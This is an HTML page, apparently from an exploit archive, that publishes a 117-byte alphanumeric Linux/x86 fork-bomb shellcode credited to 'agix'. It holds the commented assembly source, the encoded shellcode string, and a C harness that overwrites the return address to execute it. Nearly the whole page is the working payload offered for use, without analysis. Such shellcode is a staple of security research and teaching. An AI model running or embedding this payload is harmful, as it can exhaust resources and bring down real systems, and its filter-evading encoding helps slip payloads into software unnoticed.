<html><head><title>Linux/x86 - alphanuméric Bomb FORK Shellcode - 117 Bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 | Title: Linux/x86 alphanuméric Bomb FORK Shellcode 117 Bytes
 | Type: Shellcode
 | Author: agix
 | Platform: Linux X86
*/

/*
dec esp
        dec esp
        dec esp
        dec esp
        push dword 0x58494741
        pop eax
        xor eax, 0x58494741
        dec eax 
        pop edx
        push esp
        pop ecx 
        push eax
        push ecx
        push edx
        push eax
        push esp
        push ebp
        push edx
        push edi
        popad
        dec ecx
        push dword 0x45525649
        dec ecx
        xor [ecx], bh
        push word 0x5445
        pop dx
        xor [ecx], dh
        dec ecx
        xor [ecx], bh
        push word 0x4255
        pop dx
        xor[ecx], dh
        dec ecx
        xor [ecx], bh
        push word 0x3636
        pop dx
        xor [ecx], dh
        dec ecx
        push dword 0x6b6e756a
        xor [ecx], bh
        push word 0x5974
        pop dx
        xor [ecx], dh
        dec ecx
        push word 0x3636
        pop dx
        xor [ecx], dh
        dec ecx
        push word 0x776F
        pop dx
        xor [ecx], dh
        push esp
        push esi
        pop ecx
        xor [ecx + 116], bh
        push word 0x7065
        pop dx
        xor [ecx + 116], dh
        dec esp
*/


#include &lt;stdio.h&gt;


char shellcode[] =

&quot;LLLLhAGIXX5AGIXHZTYPQRPTURWaIhIVREI09fhETfZ01I09fhUBfZ01I09fh66fZ01Ihjunk09fhtYfZ01Ifh66fZ01IfhowfZ01TVY0ytfhepfZ0qtL&quot;;


int main(int argc, char **argv) {
        int *ret;
        ret = (int *)&amp;ret + 2;
        (*ret) = (int) shellcode;
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
